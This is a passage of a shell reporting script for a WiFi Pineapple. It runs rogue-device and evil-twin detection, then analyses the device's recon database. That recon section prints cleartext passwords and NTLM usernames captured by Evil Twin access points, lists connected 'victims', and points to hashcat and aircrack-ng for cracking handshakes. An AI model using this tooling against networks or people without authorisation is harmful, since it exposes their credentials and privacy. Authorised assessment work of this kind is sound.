        echo "  • DROP    = Silently discard the traffic (no response)"
        echo "  • REJECT  = Block traffic and send error back to sender"
        echo "  • MASQUERADE = Hide internal IPs behind Pineapple's IP"
        echo "  • SNAT/DNAT = Source/Destination NAT (IP translation)"
        echo "  • Chain   = A list of rules checked in order"
        echo "  • Policy  = Default action if no rules match"
        echo ""
        echo "═══════════════════════════════════════════════════════════════"
        echo ""

    else
        echo "Firewall Backend: iptables (legacy)"
        echo ""

        # Legacy iptables support
        echo "=== IPTABLES RULES ==="
        iptables -L -n -v 2>/dev/null || echo "[!] iptables not available"
        echo ""
        echo "=== NAT RULES ==="
        iptables -t nat -L -n -v 2>/dev/null || echo "[!] iptables nat table not available"
        echo ""
        echo "=== MANGLE RULES ==="
        iptables -t mangle -L -n -v 2>/dev/null || echo "[!] iptables mangle table not available"
    fi

} > "${REPORT_DIR}/network/firewall_rules.txt"
LOG "    [OK] Firewall rules saved"

# ============================================================================
# ROGUE DEVICE DETECTION
# ============================================================================

if [ "$ENABLE_ROGUE_DETECTION" = true ]; then
    LOG ""
    LOG "[*] Performing rogue device detection..."

{
    echo "=== ROGUE DEVICE DETECTION ==="
    echo "Timestamp: $(date)"
    echo ""
    echo "This section identifies potentially malicious or unexpected devices on the network."
    echo "NOTE: WiFi Pineapple virtual interfaces are whitelisted and marked as [NORMAL]."
    echo ""

    # Detect unusual DHCP servers
    echo "** ROGUE DHCP SERVER DETECTION **"
    echo "Purpose: Detect unauthorized DHCP servers that could redirect traffic"
    echo ""
    dhcp_servers=$(grep -oE "from [0-9]+\.[0-9]+\.[0-9]+\.[0-9]+" /var/log/messages 2>/dev/null | awk '{print $2}' | sort | uniq)
    expected_dhcp=$(ip addr show br-lan | grep -oE "inet [0-9]+\.[0-9]+\.[0-9]+\.[0-9]+" | awk '{print $2}')

    echo "  Expected DHCP Server (Pineapple): $expected_dhcp"
    echo "  Detected DHCP Activity:"
    if [ -n "$dhcp_servers" ]; then
        rogue_dhcp_count=0
        echo "$dhcp_servers" | while read server; do
            if [ "$server" != "$expected_dhcp" ]; then
                echo "    [!] ROGUE: $server (UNEXPECTED DHCP SERVER - INVESTIGATE!)"
                rogue_dhcp_count=$((rogue_dhcp_count + 1))
            else
                echo "    [OK] $server (expected - Pineapple DHCP)"
            fi
        done
    else
        echo "    [INFO] No DHCP activity found in system logs"
        echo "    [INFO] This is normal if the scan just started or logs were cleared"
    fi
    echo ""

    # Detect multiple gateways
    echo "** MULTIPLE GATEWAY DETECTION **"
    echo "Purpose: Multiple gateways can indicate network hijacking or MITM attacks"
    echo ""
    gateways=$(ip route | grep "^default" | awk '{print $3}')
    gateway_count=$(echo "$gateways" | grep -c "^" 2>/dev/null); gateway_count=${gateway_count:-0}

    if [ "$gateway_count" -gt 1 ]; then
        echo "  [!] WARNING: Multiple default gateways detected!"
        echo "  [!] This could indicate a rogue router or network misconfiguration:"
        echo "$gateways" | while read gw; do
            echo "    - Gateway: $gw"
        done
        echo ""
        echo "  [ACTION REQUIRED] Investigate why multiple gateways exist"
    elif [ "$gateway_count" -eq 1 ]; then
        echo "  [OK] Single default gateway: $gateways"
        echo "  [INFO] This is the upstream network gateway"
    else
        echo "  [WARNING] No default gateway found"
        echo "  [INFO] Pineapple may not have internet connectivity"
    fi
    echo ""

    # Detect unusual management interfaces
    echo "** NETWORK INTERFACE ANALYSIS **"
    echo "Purpose: Document all active network interfaces and their configurations"
    echo ""
    echo "  Active Interfaces with IP Addresses:"
    ip addr show | grep "inet " | grep -v "127.0.0.1" | while read line; do
        iface=$(echo "$line" | awk '{print $NF}')
        ip=$(echo "$line" | awk '{print $2}')

        # Classify interface
        case "$iface" in
            br-lan)
                echo "    [NORMAL] $iface: $ip (Pineapple management bridge)"
                ;;
            wlan*cli)
                echo "    [NORMAL] $iface: $ip (Pineapple client mode - upstream WiFi)"
                ;;
            wlan*)
                echo "    [NORMAL] $iface: $ip (Wireless interface)"
                ;;
            eth*)
                echo "    [NORMAL] $iface: $ip (Ethernet interface)"
                ;;
            tun*|tap*)
                echo "    [INFO] $iface: $ip (VPN/Tunnel interface)"
                ;;
            *)
                echo "    [?] $iface: $ip (Unknown interface type)"
                ;;
        esac
    done
    echo ""

    # Detect MAC address spoofing indicators
    echo "** MAC ADDRESS SPOOFING ANALYSIS **"
    echo "Purpose: Identify locally-administered MACs that may indicate spoofing"
    echo "Note: WiFi Pineapple uses '13:37' in virtual MACs - these are NORMAL"
    echo ""

    suspicious_mac_count=0
    pineapple_mac_count=0

    ip link show | grep "link/ether" | while read line; do
        iface=$(ip link show | grep -B1 "$line" | head -1 | awk '{print $2}' | sed 's/:$//')
        mac=$(echo "$line" | awk '{print $2}')

        # Check if locally administered (bit 1 of first octet is 1)
        first_octet=$(echo "$mac" | cut -d':' -f1)
        decimal=$((16#$first_octet))

        if [ $((decimal & 2)) -eq 2 ]; then
            # Check if it's a Pineapple signature MAC (contains 13:37)
            if echo "$mac" | grep -qi "13:37"; then
                echo "    [NORMAL] $mac ($iface) - WiFi Pineapple virtual interface"
                pineapple_mac_count=$((pineapple_mac_count + 1))
            else
                echo "    [!] SUSPICIOUS: $mac ($iface) - Locally administered, non-Pineapple"
                echo "        -> May indicate MAC spoofing or virtual interface"
                suspicious_mac_count=$((suspicious_mac_count + 1))
            fi
        fi
    done

    echo ""
    echo "  Summary:"
    echo "    - Pineapple virtual MACs: $pineapple_mac_count (normal)"
    if [ "$suspicious_mac_count" -gt 0 ]; then
        echo "    - Suspicious MACs: $suspicious_mac_count (INVESTIGATE)"
    else
        echo "    - Suspicious MACs: 0 (good)"
    fi
    echo ""

    # Detect duplicate IP addresses
    echo "** DUPLICATE IP / ARP SPOOFING DETECTION **"
    echo "Purpose: Detect ARP spoofing attacks or IP conflicts"
    echo ""

    arp -a | awk '{print $2}' | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | sort | uniq -d > /tmp/dup_ips.txt

    if [ -s /tmp/dup_ips.txt ]; then
        echo "  [!] CRITICAL: Duplicate IP addresses detected!"
        echo "  [!] This may indicate ARP spoofing or IP conflicts:"
        echo ""
        cat /tmp/dup_ips.txt | while read dup_ip; do
            echo "  Duplicate IP: $dup_ip"
            arp -a | grep "$dup_ip" | while read line; do
                echo "    -> $line"
            done
            echo ""
        done
        echo "  [ACTION REQUIRED] Investigate these duplicate IPs immediately"
    else
        echo "  [OK] No duplicate IP addresses detected"
        echo "  [INFO] ARP table appears clean"
    fi
    rm -f /tmp/dup_ips.txt
    echo ""

    # MAC Randomization Detection
    echo "** MAC RANDOMIZATION DETECTION **"
    echo "Purpose: Identify devices using randomized MAC addresses"
    echo "  (May indicate privacy tools, mobile devices, or reconnaissance)"
    echo ""

    randomized_count=0
    randomized_macs=""

    # Check ARP table for randomized MACs
    # Locally administered bit: 2nd hex char is 2, 6, A, or E
    for mac in $(arp -an 2>/dev/null | grep -oE '([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}'); do
        second_char=$(echo "$mac" | cut -c2)
        if echo "$second_char" | grep -qiE '[26ae]'; then
            # Check if it's a Pineapple signature MAC (contains 13:37)
            if ! echo "$mac" | grep -qi "13:37"; then
                echo "  [!] Randomized MAC detected: $mac"
                # Try to get IP associated with this MAC
                ip_addr=$(arp -an 2>/dev/null | grep -i "$mac" | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | head -1)
                [ -n "$ip_addr" ] && echo "      Associated IP: $ip_addr"
                randomized_count=$((randomized_count + 1))
                randomized_macs="${randomized_macs}${mac}\n"
            fi
        fi
    done

    # Also check DHCP leases for randomized MACs
    if [ -f /tmp/dhcp.leases ]; then
        while read lease_line; do
            mac=$(echo "$lease_line" | awk '{print $2}')
            if [ -n "$mac" ]; then
                second_char=$(echo "$mac" | cut -c2)
                if echo "$second_char" | grep -qiE '[26ae]'; then
                    if ! echo "$mac" | grep -qi "13:37" && ! echo -e "$randomized_macs" | grep -qi "$mac"; then
                        hostname=$(echo "$lease_line" | awk '{print $4}')
                        ip_addr=$(echo "$lease_line" | awk '{print $3}')
                        echo "  [!] Randomized MAC in DHCP: $mac"
                        [ -n "$ip_addr" ] && echo "      IP: $ip_addr"
                        [ -n "$hostname" ] && [ "$hostname" != "*" ] && echo "      Hostname: $hostname"
                        randomized_count=$((randomized_count + 1))
                    fi
                fi
            fi
        done < /tmp/dhcp.leases
    fi

    echo ""
    if [ "$randomized_count" -eq 0 ]; then
        echo "  [OK] No randomized MAC addresses detected"
    else
        echo "  Total randomized MACs: $randomized_count"
        echo ""
        echo "  [INFO] Randomized MACs may indicate:"
        echo "    - Privacy-conscious mobile devices (iOS, Android)"
        echo "    - Security researchers or penetration testers"
        echo "    - Devices attempting to avoid tracking"
        echo "    - Potential reconnaissance activity"
    fi
    echo ""

    # Detect evil twin APs (similar SSIDs on different channels)
    echo "** EVIL TWIN ACCESS POINT DETECTION **"
    echo "Purpose: Detect duplicate SSIDs that may be spoofed APs for phishing"
    echo ""

    if [ -f "${REPORT_DIR}/wireless/wifi_scan.txt" ]; then
        evil_twin_found=false

        # Create a temporary file to track SSIDs and their frequencies
        grep -E "SSID:|freq:" "${REPORT_DIR}/wireless/wifi_scan.txt" | \
        awk '/SSID:/{ssid=$2} /freq:/{print ssid, $2}' | \
        sort | uniq > /tmp/ssid_freq.txt

        # Check for duplicate SSIDs
        awk '{print $1}' /tmp/ssid_freq.txt | sort | uniq -c | while read count ssid; do
            if [ "$count" -gt 1 ]; then
                echo "  [!] POTENTIAL EVIL TWIN: SSID '$ssid' appears $count times"
                echo "      Frequencies:"
                grep "^$ssid " /tmp/ssid_freq.txt | while read s freq; do
                    echo "        - $freq MHz"
                done
                echo ""
                evil_twin_found=true
            fi
        done

        if [ "$evil_twin_found" = false ]; then
            echo "  [OK] No duplicate SSIDs detected"
            echo "  [INFO] All networks appear to be unique"
        fi

        rm -f /tmp/ssid_freq.txt
    else
        echo "  [INFO] WiFi scan data not available"
    fi
    echo ""

    # Bridge/Tethering detection
    echo "** NAT & FORWARDING CONFIGURATION **"
    echo "Purpose: Verify network routing configuration"
    echo ""

    # Check IP forwarding
    if [ -f /proc/sys/net/ipv4/ip_forward ]; then
        forward_status=$(cat /proc/sys/net/ipv4/ip_forward)
        if [ "$forward_status" = "1" ]; then
            echo "  [NORMAL] IP forwarding: ENABLED"
            echo "  [INFO] This is expected for WiFi Pineapple to route traffic"
        else
            echo "  [WARNING] IP forwarding: DISABLED"
            echo "  [INFO] Pineapple may not be able to route traffic"
        fi
    fi
    echo ""

    # Check NAT rules with better detection (nftables/fw4 or iptables)
    echo "  NAT/Masquerade Rules:"

    # Try nftables first (OpenWrt 22.03+ / Pager)
    if check_tool nft; then
        nat_output=$(nft list ruleset 2>/dev/null)
        masq_count=$(echo "$nat_output" | grep -ci "masquerade"); masq_count=${masq_count:-0}
        snat_count=$(echo "$nat_output" | grep -ci "snat"); snat_count=${snat_count:-0}
        dnat_count=$(echo "$nat_output" | grep -ci "dnat"); dnat_count=${dnat_count:-0}
    else
        # Fallback to iptables
        nat_output=$(iptables -t nat -L -n -v 2>/dev/null)
        masq_count=$(echo "$nat_output" | grep -c "MASQUERADE"); masq_count=${masq_count:-0}
        snat_count=$(echo "$nat_output" | grep -c "SNAT"); snat_count=${snat_count:-0}
        dnat_count=$(echo "$nat_output" | grep -c "DNAT"); dnat_count=${dnat_count:-0}
    fi

    total_nat=$((masq_count + snat_count + dnat_count))

    echo "    - MASQUERADE rules: $masq_count"
    echo "    - SNAT rules: $snat_count"
    echo "    - DNAT rules: $dnat_count"
    echo "    - Total NAT rules: $total_nat"
    echo ""

    if [ "$total_nat" -eq 0 ]; then
        echo "  [WARNING] No NAT rules found"
        echo "  [INFO] Pineapple may not be properly configured for internet sharing"
    else
        echo "  [NORMAL] NAT rules are configured"
        echo "  [INFO] Pineapple can route and masquerade traffic"
    fi
    echo ""

    # Overall summary
    echo "═══════════════════════════════════════════════════════════════"
    echo "  ROGUE DEVICE DETECTION SUMMARY"
    echo "═══════════════════════════════════════════════════════════════"
    echo ""
    echo "Checks Performed:"
    echo "  ✓ DHCP Server Detection"
    echo "  ✓ Multiple Gateway Detection"
    echo "  ✓ Interface Analysis"
    echo "  ✓ MAC Spoofing Detection (with Pineapple whitelisting)"
    echo "  ✓ Duplicate IP / ARP Spoofing Detection"
    echo "  ✓ Evil Twin AP Detection"
    echo "  ✓ NAT Configuration Verification"
    echo ""

} > "${REPORT_DIR}/analysis/rogue_device_detection.txt"

# Count only actual threats (exclude [NORMAL] and [INFO] markers)
ROGUE_FINDINGS=$(grep -c "\[!\]" "${REPORT_DIR}/analysis/rogue_device_detection.txt" 2>/dev/null); ROGUE_FINDINGS=${ROGUE_FINDINGS:-0}

# Add severity scoring based on specific rogue device findings
if [ -f "${REPORT_DIR}/analysis/rogue_device_detection.txt" ]; then
    # Check for rogue DHCP servers
    ROGUE_DHCP=$(grep -c "ROGUE DHCP.*detected\|Multiple DHCP servers" "${REPORT_DIR}/analysis/rogue_device_detection.txt" 2>/dev/null); ROGUE_DHCP=${ROGUE_DHCP:-0}
    for i in $(seq 1 ${ROGUE_DHCP}); do
        add_finding "HIGH" "Rogue DHCP server detected"
    done

    # Check for duplicate IPs / ARP spoofing
    DUP_IP=$(grep -c "Duplicate IP addresses detected" "${REPORT_DIR}/analysis/rogue_device_detection.txt" 2>/dev/null); DUP_IP=${DUP_IP:-0}
    for i in $(seq 1 ${DUP_IP}); do
        add_finding "HIGH" "Duplicate IP / ARP spoofing detected"
    done

    # Check for suspicious MACs (non-Pineapple locally administered)
    SUSP_MAC=$(grep -c "SUSPICIOUS.*Locally administered, non-Pineapple" "${REPORT_DIR}/analysis/rogue_device_detection.txt" 2>/dev/null); SUSP_MAC=${SUSP_MAC:-0}
    for i in $(seq 1 ${SUSP_MAC}); do
        add_finding "MEDIUM" "Suspicious MAC address detected (possible spoofing)"
    done

    # Check for randomized MACs
    RAND_MAC=$(grep -c "Randomized MAC detected:" "${REPORT_DIR}/analysis/rogue_device_detection.txt" 2>/dev/null); RAND_MAC=${RAND_MAC:-0}
    for i in $(seq 1 ${RAND_MAC}); do
        add_finding "LOW" "Randomized MAC address detected"
    done

    # Check for Evil Twin APs
    EVIL_TWIN=$(grep -c "POTENTIAL EVIL TWIN" "${REPORT_DIR}/analysis/rogue_device_detection.txt" 2>/dev/null); EVIL_TWIN=${EVIL_TWIN:-0}
    for i in $(seq 1 ${EVIL_TWIN}); do
        add_finding "HIGH" "Potential Evil Twin access point detected"
    done
fi

if [ "$ROGUE_FINDINGS" -gt 0 ]; then
        LOG "    [!] ${ROGUE_FINDINGS} potential security issues detected - REVIEW REQUIRED"
    else
        LOG "    [OK] No rogue devices or security threats detected"
    fi
else
    LOG ""
    LOG "[*] Rogue device detection skipped (QUICK scan mode)"
fi

# ============================================================================
# PINEAPPLE RECON DATABASE ANALYSIS
# ============================================================================

if [ "$ENABLE_RECON_DB_ANALYSIS" = true ]; then
    LOG "[*] Analyzing Pineapple recon database..."

    # Find recon.db - check multiple possible locations
    RECON_DB=""
    for db_path in "$RECON_DB_PATH" "/root/recon/recon.db" "/mmc/root/recon/recon.db" "/sd/root/recon/recon.db"; do
        if [ -f "$db_path" ]; then
            RECON_DB="$db_path"
            break
        fi
    done

    if [ -n "$RECON_DB" ] && check_tool sqlite3; then
        {
            echo "=== PINEAPPLE RECON INTELLIGENCE REPORT ==="
            echo "Timestamp: $(date)"
            echo "Database: $RECON_DB"
            echo ""

            # Database overview
            echo "═══════════════════════════════════════════════════════════════"
            echo "  DATABASE OVERVIEW"
            echo "═══════════════════════════════════════════════════════════════"
            echo ""

            TOTAL_DEVICES=$(sqlite3 "$RECON_DB" "SELECT COUNT(DISTINCT mac) FROM wifi_device;" 2>/dev/null)
            TOTAL_SSIDS=$(sqlite3 "$RECON_DB" "SELECT COUNT(DISTINCT ssid) FROM ssid WHERE ssid != '';" 2>/dev/null)
            TOTAL_BSSIDS=$(sqlite3 "$RECON_DB" "SELECT COUNT(DISTINCT bssid) FROM ssid;" 2>/dev/null)
            HIDDEN_NETS=$(sqlite3 "$RECON_DB" "SELECT COUNT(*) FROM ssid WHERE hidden=1;" 2>/dev/null)
            OPEN_NETS=$(sqlite3 "$RECON_DB" "SELECT COUNT(DISTINCT bssid) FROM ssid WHERE encryption=0;" 2>/dev/null)
            TOTAL_SCANS=$(sqlite3 "$RECON_DB" "SELECT COUNT(*) FROM scan;" 2>/dev/null)

            echo "  Total Unique Devices Seen:    ${TOTAL_DEVICES:-0}"
            echo "  Total Unique SSIDs:           ${TOTAL_SSIDS:-0}"
            echo "  Total Access Points (BSSIDs): ${TOTAL_BSSIDS:-0}"
            echo "  Hidden Networks:              ${HIDDEN_NETS:-0}"
            echo "  Open Networks (No Encryption):${OPEN_NETS:-0}"
            echo "  Total Recon Scans:            ${TOTAL_SCANS:-0}"
            echo ""

            # Captured credentials (CRITICAL)
            echo "═══════════════════════════════════════════════════════════════"
            echo "  CAPTURED CREDENTIALS"
            echo "═══════════════════════════════════════════════════════════════"
            echo ""

            # Basic auth (cleartext passwords)
            BASIC_CREDS=$(sqlite3 "$RECON_DB" "SELECT COUNT(*) FROM hostap_basic;" 2>/dev/null)
            if [ "${BASIC_CREDS:-0}" -gt 0 ]; then
                echo "  [!!!] CLEARTEXT CREDENTIALS CAPTURED: $BASIC_CREDS"
                echo ""
                sqlite3 -header "$RECON_DB" "SELECT type, identity, password, datetime(time, 'unixepoch') as captured_time FROM hostap_basic ORDER BY time DESC LIMIT 20;" 2>/dev/null | sed 's/^/  /'
                echo ""
                add_finding "CRITICAL" "Cleartext credentials captured via Evil Twin ($BASIC_CREDS entries)"
            else
                echo "  [OK] No cleartext credentials captured"
            fi
            echo ""

            # Challenge-response (NTLM hashes)
            CHALRESP_COUNT=$(sqlite3 "$RECON_DB" "SELECT COUNT(*) FROM hostap_chalresp;" 2>/dev/null)
            if [ "${CHALRESP_COUNT:-0}" -gt 0 ]; then
                echo "  [!!] NTLM/CHALLENGE-RESPONSE HASHES CAPTURED: $CHALRESP_COUNT"
                echo ""
                sqlite3 -header "$RECON_DB" "SELECT type, username, datetime(time, 'unixepoch') as captured_time FROM hostap_chalresp ORDER BY time DESC LIMIT 20;" 2>/dev/null | sed 's/^/  /'
                echo ""
                echo "  [*] These hashes can be cracked with hashcat/john"
                add_finding "HIGH" "NTLM challenge-response hashes captured ($CHALRESP_COUNT entries)"
            else
                echo "  [OK] No challenge-response hashes captured"
            fi
            echo ""

            # WPA Handshakes
            HANDSHAKE_COUNT=$(sqlite3 "$RECON_DB" "SELECT COUNT(*) FROM handshake;" 2>/dev/null)
            HOSTAP_HS_COUNT=$(sqlite3 "$RECON_DB" "SELECT COUNT(*) FROM hostap_handshake;" 2>/dev/null)
            TOTAL_HANDSHAKES=$((${HANDSHAKE_COUNT:-0} + ${HOSTAP_HS_COUNT:-0}))

            if [ "$TOTAL_HANDSHAKES" -gt 0 ]; then
                echo "  [!!] WPA HANDSHAKES CAPTURED: $TOTAL_HANDSHAKES"
                echo "      - Passive captures: ${HANDSHAKE_COUNT:-0}"
                echo "      - Evil Twin captures: ${HOSTAP_HS_COUNT:-0}"
                echo ""
                echo "  [*] These can be cracked with aircrack-ng/hashcat"
                add_finding "HIGH" "WPA handshakes captured ($TOTAL_HANDSHAKES total)"
            else
                echo "  [OK] No WPA handshakes captured"
            fi
            echo ""

            # Clients that connected to Evil Twin
            echo "═══════════════════════════════════════════════════════════════"
            echo "  EVIL TWIN VICTIMS (Clients Who Connected)"
            echo "═══════════════════════════════════════════════════════════════"
            echo ""

            VICTIM_COUNT=$(sqlite3 "$RECON_DB" "SELECT COUNT(DISTINCT mac) FROM hostap_client;" 2>/dev/null)
            if [ "${VICTIM_COUNT:-0}" -gt 0 ]; then
                echo "  [!] DEVICES CONNECTED TO EVIL TWIN APs: $VICTIM_COUNT"
                echo ""
                echo "  MAC Address     | SSID Connected To        | Connected Time"
                echo "  ----------------|--------------------------|------------------"
                sqlite3 "$RECON_DB" "SELECT mac, ssid, datetime(connected_time, 'unixepoch') FROM hostap_client ORDER BY connected_time DESC LIMIT 25;" 2>/dev/null | while IFS='|' read mac ssid ctime; do
                    printf "  %-16s| %-24s | %s\n" "$mac" "$ssid" "$ctime"
                done
                echo ""
                add_finding "MEDIUM" "Devices connected to Evil Twin APs ($VICTIM_COUNT victims)"
            else
                echo "  [OK] No clients connected to Evil Twin APs"
            fi
            echo ""

            # Open networks (attack surface)
            echo "═══════════════════════════════════════════════════════════════"
            echo "  OPEN NETWORKS (No Encryption)"
            echo "═══════════════════════════════════════════════════════════════"
            echo ""

            if [ "${OPEN_NETS:-0}" -gt 0 ]; then
                echo "  Open networks are vulnerable to traffic interception:"
                echo ""
                echo "  SSID                     | BSSID        | Signal"
                echo "  -------------------------|--------------|-------"
                sqlite3 "$RECON_DB" "SELECT DISTINCT ssid, bssid, MAX(signal) as sig FROM ssid WHERE encryption=0 AND ssid != '' GROUP BY ssid ORDER BY sig DESC LIMIT 20;" 2>/dev/null | while IFS='|' read ssid bssid signal; do
                    printf "  %-25s| %s | %s dBm\n" "$ssid" "$bssid" "$signal"
                done
                echo ""
            else
                echo "  [OK] No open networks in database"
            fi
            echo ""

            # Hidden networks
            echo "═══════════════════════════════════════════════════════════════"
            echo "  HIDDEN NETWORKS"
            echo "═══════════════════════════════════════════════════════════════"
            echo ""

            if [ "${HIDDEN_NETS:-0}" -gt 0 ]; then
                echo "  Hidden networks detected: $HIDDEN_NETS"
                echo ""
                echo "  BSSID        | Channel | Signal | Encryption"
                echo "  -------------|---------|--------|------------"
                sqlite3 "$RECON_DB" "SELECT bssid, channel, signal, encryption FROM ssid WHERE hidden=1 ORDER BY signal DESC LIMIT 20;" 2>/dev/null | while IFS='|' read bssid channel signal enc; do
                    enc_str="Unknown"
                    [ "$enc" = "0" ] && enc_str="Open"
                    [ "$enc" = "2" ] && enc_str="WEP"
                    printf "  %-13s| %-7s | %-6s | %s\n" "$bssid" "$channel" "$signal" "$enc_str"
                done
                echo ""
            else
                echo "  [OK] No hidden networks detected"
            fi
            echo ""

            # Most active devices (by packet count)
            echo "═══════════════════════════════════════════════════════════════"
            echo "  MOST ACTIVE DEVICES (Top Talkers)"
            echo "═══════════════════════════════════════════════════════════════"
            echo ""
            echo "  MAC Address    | Packets  | Signal | Frequency"
            echo "  ---------------|----------|--------|----------"
            sqlite3 "$RECON_DB" "SELECT mac, SUM(packets) as total_packets, MAX(signal) as sig, freq FROM wifi_device GROUP BY mac ORDER BY total_packets DESC LIMIT 20;" 2>/dev/null | while IFS='|' read mac packets signal freq; do
                # Format MAC with colons
                mac_fmt=$(echo "$mac" | sed 's/\(..\)/\1:/g; s/:$//')
                printf "  %-15s| %-8s | %-6s | %s MHz\n" "$mac_fmt" "$packets" "$signal" "$freq"
            done
            echo ""

            # Devices probing for specific networks
            echo "═══════════════════════════════════════════════════════════════"
            echo "  PROBE REQUEST ANALYSIS"
            echo "═══════════════════════════════════════════════════════════════"
            echo ""
            echo "  Devices seen searching for these networks:"
            echo ""
            sqlite3 "$RECON_DB" "SELECT ssid, COUNT(DISTINCT wifi_device) as device_count FROM ssid WHERE type=1 AND ssid != '' GROUP BY ssid ORDER BY device_count DESC LIMIT 20;" 2>/dev/null | while IFS='|' read ssid count; do
                echo "    - \"$ssid\" (searched by $count devices)"
            done
            echo ""

            # Scan history
            echo "═══════════════════════════════════════════════════════════════"
            echo "  RECON SCAN HISTORY"
            echo "═══════════════════════════════════════════════════════════════"
            echo ""
            sqlite3 "$RECON_DB" "SELECT id, name, datetime(time, 'unixepoch') as scan_time FROM scan ORDER BY time DESC LIMIT 10;" 2>/dev/null | while IFS='|' read id name stime; do
                echo "    Scan #$id: $name @ $stime"
            done
            echo ""

            # Summary
            echo "═══════════════════════════════════════════════════════════════"
            echo "  RECON INTELLIGENCE SUMMARY"
            echo "═══════════════════════════════════════════════════════════════"
            echo ""
            echo "  Total Devices Observed:     ${TOTAL_DEVICES:-0}"
            echo "  Total Networks Discovered:  ${TOTAL_SSIDS:-0}"
            echo "  Hidden Networks:            ${HIDDEN_NETS:-0}"
            echo "  Open Networks:              ${OPEN_NETS:-0}"
            echo "  Credentials Captured:       $((${BASIC_CREDS:-0} + ${CHALRESP_COUNT:-0}))"
            echo "  WPA Handshakes:             ${TOTAL_HANDSHAKES:-0}"
            echo "  Evil Twin Victims:          ${VICTIM_COUNT:-0}"
            echo ""

            if [ "$((${BASIC_CREDS:-0} + ${CHALRESP_COUNT:-0} + ${TOTAL_HANDSHAKES:-0}))" -gt 0 ]; then
                echo "  [!!!] ACTIONABLE INTELLIGENCE AVAILABLE"
                echo "  [*] Review captured credentials and handshakes"
            fi
            echo ""

        } > "${REPORT_DIR}/analysis/recon_intelligence.txt"

        # Copy the recon.db for offline analysis
        cp "$RECON_DB" "${REPORT_DIR}/analysis/recon.db" 2>/dev/null && \
            LOG "    [+] Copied recon.db for offline analysis"

        # Log summary
        LOG "    [OK] Recon database analysis complete"
        LOG "    [+] Devices: ${TOTAL_DEVICES:-0} | SSIDs: ${TOTAL_SSIDS:-0} | Open: ${OPEN_NETS:-0}"

        if [ "$((${BASIC_CREDS:-0} + ${CHALRESP_COUNT:-0}))" -gt 0 ]; then
            LOG "    [!!!] CREDENTIALS CAPTURED: $((${BASIC_CREDS:-0} + ${CHALRESP_COUNT:-0}))"
        fi
        if [ "${TOTAL_HANDSHAKES:-0}" -gt 0 ]; then
            LOG "    [!!] WPA HANDSHAKES: ${TOTAL_HANDSHAKES}"
        fi

    else
        if [ -z "$RECON_DB" ]; then
            LOG "    [!] Recon database not found at expected locations"
        else
            LOG "    [!] sqlite3 not available - skipping recon.db analysis"
        fi
    fi
fi

# ============================================================================
# GEOLOCATION & PHYSICAL SECURITY
# ============================================================================

if [ "$ENABLE_GEOLOCATION" = true ]; then
    LOG "[*] Collecting geolocation data..."

{
    echo "=== GEOLOCATION & PHYSICAL SECURITY ==="
    echo "Timestamp: $(date)"
    echo ""

    # GPS data if available
    echo "** GPS LOCATION **"
    if check_tool gpsd || check_tool gpspipe; then
        echo "  Attempting to retrieve GPS coordinates..."
        if check_tool gpspipe; then
            gps_data=$(timeout 5 gpspipe -w -n 10 2>/dev/null | grep -m1 "TPV" | jq -r '"\(.lat),\(.lon)"' 2>/dev/null)
            if [ -n "$gps_data" ] && [ "$gps_data" != "null,null" ]; then
                echo "  [+] GPS Coordinates: $gps_data"
                echo "  [+] Google Maps: https://www.google.com/maps?q=$gps_data"
            else
                echo "  [!] GPS data not available"
            fi
        else
            echo "  [!] GPS tools available but no data received"
        fi
    else
        echo "  [!] No GPS hardware/software detected"
    fi
    echo ""

    # WiFi-based geolocation (using nearby AP BSSIDs)
    echo "** WIFI GEOLOCATION DATA **"
    echo "  Nearby access points can be used for triangulation:"
    if [ -f "${REPORT_DIR}/wireless/wifi_scan.txt" ]; then
        grep -E "BSS|SSID:|signal:" "${REPORT_DIR}/wireless/wifi_scan.txt" | \
        awk '/^BSS/{bssid=$2} /SSID/{ssid=$0} /signal/{print bssid, ssid, $0}' | head -10
    fi
    echo ""
    echo "  [*] These BSSIDs can be submitted to geolocation APIs:"
    echo "      - Google Geolocation API"
    echo "      - Mozilla Location Service"
    echo "      - WiGLE WiFi Wardriving database"
    echo ""
    echo "  [*] Incident Response Value:"
    echo "      - Confirm the physical location where the device was during the scan"
    echo "      - Identify if device was in expected location (office, home) vs unexpected (public, unknown)"
    echo "      - Correlate with physical security logs or badge access times"
    echo ""

    # Timezone information
    echo "** TIMEZONE & TIME **"
    echo "  System Timezone: $(date +%Z)"
    echo "  System Time: $(date)"
    echo "  UTC Time: $(date -u)"
    echo "  Unix Timestamp: $(date +%s)"
    echo ""

    # Physical security observations
    echo "** PHYSICAL ENVIRONMENT METRICS **"
    echo "  Uptime: $(uptime -p 2>/dev/null || uptime)"

    # Temperature sensors if available
    if [ -d /sys/class/thermal ]; then
        echo ""
        echo "  Temperature Sensors:"
        for sensor in /sys/class/thermal/thermal_zone*/temp; do
            if [ -f "$sensor" ]; then
                temp=$(($(cat "$sensor") / 1000))
                zone=$(dirname "$sensor" | xargs basename)
                echo "    $zone: ${temp}°C"
            fi
        done
    fi
    echo ""

    # Power/battery information
    if [ -d /sys/class/power_supply ]; then
        echo "  Power Status:"
        for supply in /sys/class/power_supply/*; do
            if [ -f "$supply/type" ]; then
                type=$(cat "$supply/type")
                name=$(basename "$supply")
                echo "    $name ($type):"

                [ -f "$supply/capacity" ] && echo "      Capacity: $(cat $supply/capacity)%"
                [ -f "$supply/status" ] && echo "      Status: $(cat $supply/status)"
                [ -f "$supply/voltage_now" ] && echo "      Voltage: $(cat $supply/voltage_now) µV"
            fi
        done
        echo ""
    fi

    # Network signal strengths (physical proximity indicators)
    echo "** SIGNAL STRENGTH ANALYSIS **"
    echo "  Strongest nearby networks (indicates proximity):"
    if [ -f "${REPORT_DIR}/wireless/wifi_scan.txt" ]; then
        grep -E "SSID:|signal:" "${REPORT_DIR}/wireless/wifi_scan.txt" | \
        paste - - | awk '{print $4, $2}' | sort -rn | head -10 | \
        while read signal ssid; do
            echo "    $ssid: $signal dBm"
        done
    fi
    echo ""

} > "${REPORT_DIR}/analysis/geolocation.txt"

    LOG "    [OK] Geolocation data collected"
else
    LOG "[*] Geolocation collection skipped (QUICK scan mode)"
fi

# ============================================================================
# TIMELINE & HISTORICAL ANALYSIS
# ============================================================================

if [ "$ENABLE_HISTORICAL_COMPARISON" = true ]; then
    LOG ""
    LOG "[*] Performing timeline and historical analysis..."

    # Create timeline metadata
    {
        echo "=== TIMELINE & HISTORICAL ANALYSIS ==="
        echo "Timestamp: $(date)"
